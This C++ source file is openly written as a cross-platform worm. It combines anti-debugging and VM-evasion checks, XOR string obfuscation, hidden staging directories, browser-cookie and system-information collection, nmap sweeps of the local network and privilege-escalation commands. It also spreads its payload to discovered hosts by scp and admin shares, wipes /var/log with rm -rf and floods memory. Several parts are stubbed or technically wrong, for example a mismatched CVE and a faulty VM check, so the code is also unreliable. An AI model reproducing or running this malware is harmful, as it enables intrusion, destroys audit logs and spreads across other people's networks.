#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <cstdlib>
#include <sstream>
#include <thread>
#include <chrono>
#include <algorithm>
#include <random>
#include <ctime>
#include <cstring>
#include <map>

#ifdef _WIN32
#include <winsock2.h> 
#include <windows.h>
#include <shlobj.h>
#include <direct.h>  // For _mkdir
#pragma comment(lib, "ws2_32.lib")
#elif __APPLE__
#include <TargetConditionals.h>
#include <ApplicationServices/ApplicationServices.h>
#include <unistd.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <CommonCrypto/CommonCryptor.h>
#else
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <unistd.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <openssl/evp.h>
#endif

#define ZZ(x) for(int i=0;i<x;i++)
#define AA std::string
#define BB unsigned char
#define CC char*
#define DD const char*
#define EE if
#define FF else
#define GG while
#define HH return
#define II std::vector<AA>
#define JJ std::cout
#define KK std::endl
#define LL std::ofstream
#define MM std::rand
#define NN std::to_string
#define OO std::reverse
#define PP std::ifstream
#define QQ std::cerr
#define RR std::string
#define SS std::shuffle
#define TT std::hex

#define AAA reinterpret_cast<char*>
#define BBB reinterpret_cast<unsigned char*>

#define OBFS(x) xorEncryptDecrypt(x, "super_obfuscate")
#define RANDOM_DELAY std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 1000));

// Obfuscation through XOR encryption/decryption function
AA xorEncryptDecrypt(AA a, AA b) {
    AA c = a;
    ZZ(c.size()) {
        c[i] ^= b[i % b.size()];
    }
    HH c;
}

// Anti-Debugging Function
bool isDebuggerPresent() {
#ifdef _WIN32
    return IsDebuggerPresent();
#elif __APPLE__
    // macOS anti-debugging check
    return false;
#else // __linux__
    // Linux anti-debugging check
    std::ifstream file("/proc/self/status");
    std::string line;
    while (std::getline(file, line)) {
        if (line.find("TracerPid") != std::string::npos) {
            return line.back() != '0';
        }
    }
    return false;
#endif
}

// Detect if running inside a VM
bool isVirtualizedEnvironment() {
    bool virtualized = false;
#ifdef _WIN32
    // Windows specific checks (basic example)
    virtualized = (GetSystemMetrics(SM_SERVERR2) != 0); 
#elif __APPLE__
    // macOS specific checks
    virtualized = false; // macOS specific checks can be added here
#else // __linux__
    // Linux specific checks
    std::ifstream cpuinfo("/proc/cpuinfo");
    std::string line;
    while (std::getline(cpuinfo, line)) {
        if (line.find("hypervisor") != std::string::npos) {
            virtualized = true;
            break;
        }
    }
#endif
    return virtualized;
}

// Dynamic Code Generation Example
void generateDynamicCode(AA &code) {
    // Adding random junk code
    code += "int a = rand() % 100;\n";
    code += "if (a % 2 == 0) {\n";
    code += "   std::cout << \"Even\" << std::endl;\n";
    code += "} else {\n";
    code += "   std::cout << \"Odd\" << std::endl;\n";
    code += "}\n";
}

// Function to create the worm payload script if it doesn't exist
void CreateWormPayload() {
    const std::string payloadPath = "/tmp/worm_payload.sh";
    std::ifstream infile(payloadPath);
    
    if (!infile.good()) { // If the file doesn't exist
        std::ofstream outfile(payloadPath);
        if (outfile.is_open()) {
            outfile << "#!/bin/bash\n";
            outfile << "echo \"This is a worm payload script.\"\n";
            outfile << "touch /tmp/worm_executed\n"; // Example command to show it has run
            outfile.close();
            std::cout << "Worm payload created at " << payloadPath << std::endl;
            // Make the script executable
            system(("chmod +x " + payloadPath).c_str());
        } else {
            std::cerr << "Failed to create the worm payload script." << std::endl;
        }
    } else {
        std::cout << "Worm payload already exists at " << payloadPath << std::endl;
    }
}

// Function to store collected data locally on the target machine
void StoreDataLocally(const std::string &data, const std::string &fileName) {
#ifdef _WIN32
    const std::string directory = "C:\\hidden\\";
    _mkdir(directory.c_str());  // Create a hidden directory (no permissions needed on Windows)
#else
    const std::string directory = "/tmp/.hidden/";
    mkdir(directory.c_str(), 0700); // Unix/Linux style
#endif

    std::ofstream outFile(directory + fileName, std::ios_base::app);
    outFile << data << std::endl;
    outFile.close();
}

// Function to collect stored browser cookies, session tokens, saved passwords
void CollectBrowserData() {
    JJ << OBFS("Collecting browser data...") << KK;
    std::string data = "";
#ifdef _WIN32
    data = "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies";
#elif __APPLE__ || __linux__
    data = "~/Library/Application\\ Support/Google/Chrome/Default/Cookies";
#endif
    StoreDataLocally(data, "browser_data_log.txt");
}

// Function to collect OS version, outdated apps, and misconfigurations
void CollectSystemInfo() {
    JJ << OBFS("Collecting system info...") << KK;
    std::string data = "";
#ifdef _WIN32
    data = "systeminfo";
#elif __APPLE__
    data = "sw_vers";
#elif __linux__
    data = "uname -a";
#endif
    StoreDataLocally(data, "system_info_log.txt");
}

// Function to get local IP address (cross-platform)
std::string GetLocalIPAddress() {
    std::string ipAddress = "127.0.0.1";

#ifdef _WIN32
    char buffer[256];
    DWORD dwSize = sizeof(buffer);
    GetComputerName(buffer, &dwSize);
    struct hostent *phe = gethostbyname(buffer);
    if (phe != nullptr) {
        for (int i = 0; phe->h_addr_list[i] != 0; ++i) {
            struct in_addr addr;
            memcpy(&addr, phe->h_addr_list[i], sizeof(struct in_addr));
            ipAddress = inet_ntoa(addr);
        }
    }
#elif __APPLE__ || __linux__
    struct ifaddrs *ifap, *ifa;
    struct sockaddr_in *sa;
    char addr[INET_ADDRSTRLEN];

    getifaddrs(&ifap);
    for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr->sa_family == AF_INET && !(ifa->ifa_flags & IFF_LOOPBACK)) {
            sa = (struct sockaddr_in *)ifa->ifa_addr;
            inet_ntop(AF_INET, &sa->sin_addr, addr, INET_ADDRSTRLEN);
            ipAddress = addr;
            break;
        }
    }
    freeifaddrs(ifap);
#endif

    return ipAddress;
}

// Function to calculate network range
std::string CalculateNetworkRange(const std::string &ipAddress) {
    size_t lastDot = ipAddress.find_last_of('.');
    std::string networkRange = ipAddress.substr(0, lastDot) + ".0/24";
    return networkRange;
}

// Function to scan for active IPs in the network
std::vector<std::string> ScanActiveIPs(const std::string &networkRange) {
    JJ << OBFS("Scanning for active IPs in the network...") << KK;
    std::vector<std::string> activeIPs;

#ifdef _WIN32
    // Implement network scanning for Windows if necessary
#elif __APPLE__ || __linux__
    std::string command = "nmap -sn " + networkRange + " | grep 'Nmap scan report' | awk '{print $5}'";
    FILE *fp = popen(command.c_str(), "r");
    if (fp) {
        char buffer[128];
        while (fgets(buffer, sizeof(buffer), fp) != nullptr) {
            activeIPs.push_back(std::string(buffer));
        }
        pclose(fp);
    }
#endif

    return activeIPs;
}

// Function to scan for IoT devices, smartphones, and other connected devices on the network
void ScanDevices() {
    JJ << OBFS("Scanning for IoT devices, smartphones, and other connected devices...") << KK;

    std::string ipAddress = GetLocalIPAddress();
    std::string networkRange = CalculateNetworkRange(ipAddress);
    std::string data = "";

#ifdef _WIN32
    data = "nmap -p 80,443,554,8080,8888 --open -O --osscan-guess " + networkRange;
#elif __APPLE__ || __linux__
    data = "sudo nmap -p 80,443,554,8080,8888 --open -O --osscan-guess " + networkRange;
#endif

    StoreDataLocally(data, "device_scan_log.txt");
}

// Sophisticated Payload: Privilege Escalation Attempt
void PrivilegeEscalationPayload() {
    JJ << OBFS("Attempting privilege escalation...") << KK;
    std::string data = "";
    bool alreadyElevated = false;

#ifdef _WIN32
    alreadyElevated = IsUserAnAdmin();
    if (!alreadyElevated) {
        data = "powershell Start-Process cmd -ArgumentList '/c net localgroup administrators kali /add' -Verb runAs";
    }
#elif __APPLE__ || __linux__
    alreadyElevated = (geteuid() == 0);
    if (!alreadyElevated) {
        data = "echo kali | sudo -S usermod -aG sudo kali";
    }
#endif

    if (!alreadyElevated) {
        StoreDataLocally(data, "privilege_escalation_log.txt");
    } else {
        JJ << OBFS("Already running with elevated privileges.") << KK;
    }
}

// Sophisticated Payload: Vulnerability Scanning for Privilege Escalation
void VulnerabilityScanningPayload() {
    JJ << OBFS("Scanning for privilege escalation vulnerabilities...") << KK;
    std::string data = "";
#ifdef _WIN32
    data = "wmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\" |findstr /i /v \"\"\"";
#elif __APPLE__ || __linux__
    data = "sudo --version | grep -q '1.8.25p1' && echo 'Vulnerable Sudo version detected (CVE-2021-4034).'";
    data += "\nfind /etc /usr /bin /sbin -writable";
#endif
    StoreDataLocally(data, "vulnerability_scan_log.txt");
}

// Function to delete logs (without affecting collected data)
void DeleteLogs() {
    JJ << OBFS("Deleting logs...") << KK;
#ifdef _WIN32
    system("del /f /s /q C:\\Windows\\Temp\\*.log");
#elif __APPLE__ || __linux__
    system("rm -rf /var/log/*");
#endif
}

// Function to overwrite RAM with junk data
void OverwriteRAM() {
    JJ << OBFS("Overwriting RAM with junk data...") << KK;

    const size_t size = 1024 * 1024 * 1024; // 1 GB of junk data
    char *junk = new char[size];
    
    // Fill the allocated memory with junk data
    for (size_t i = 0; i < size; ++i) {
        junk[i] = rand() % 256;
    }

    // Use the junk data in a way that might force it into RAM
    volatile char *volatile_ptr = junk;
    for (size_t i = 0; i < size; ++i) {
        volatile_ptr[i] ^= junk[i];
    }

    delete[] junk;
}

// Worm propagation function
void PropagateWorm() {
    JJ << OBFS("Propagating worm to other devices...") << KK;

    const std::string targetFile = "/tmp/worm_payload.sh";
    std::string localIP = GetLocalIPAddress();
    std::string networkRange = CalculateNetworkRange(localIP);

    std::vector<std::string> activeIPs = ScanActiveIPs(networkRange);

    for (const auto &ip : activeIPs) {
#ifdef _WIN32
        system(("copy " + targetFile + " \\\\" + ip + "\\C$\\Windows\\Temp\\worm_payload.bat").c_str());
#elif __APPLE__ || __linux__
        system(("scp " + targetFile + " user@" + ip + ":/tmp/worm_payload.sh").c_str());
#endif
    }
}

// Modular Payload Execution
void executeModule(const std::string &module) {
    if (module == "CollectBrowserData") {
        CollectBrowserData();
    } else if (module == "PrivilegeEscalation") {
        PrivilegeEscalationPayload();
    } else if (module == "ScanNetwork") {
        ScanDevices();
    } else if (module == "VulnerabilityScan") {
        VulnerabilityScanningPayload();
    }
}

// Main function
int main() {
    // Anti-debugging and environment checks
    if (isDebuggerPresent()) {
        JJ << OBFS("Debugger detected, exiting...") << KK;
        HH 1;  // Exit if a debugger is detected
    }

    if (isVirtualizedEnvironment()) {
        JJ << OBFS("Running in a virtualized environment, reducing activity...") << KK;
        RANDOM_DELAY
        HH 0;  // Exit if running in a virtualized environment
    }

    // If neither a debugger nor a virtualized environment is detected, proceed
    RANDOM_DELAY
    std::srand(std::time(0));

    // Create the worm payload if it doesn't exist
    CreateWormPayload();

    // Generate dynamic code
    AA dynamicScript;
    generateDynamicCode(dynamicScript);

    // Execute modular payloads
    executeModule("CollectBrowserData");
    executeModule("PrivilegeEscalation");
    executeModule("ScanNetwork");
    executeModule("VulnerabilityScan");

    // Propagate worm to other devices
    PropagateWorm();

    // Delete logs without affecting collected data and overwrite RAM
    DeleteLogs();
    OverwriteRAM();

    return 0;
}
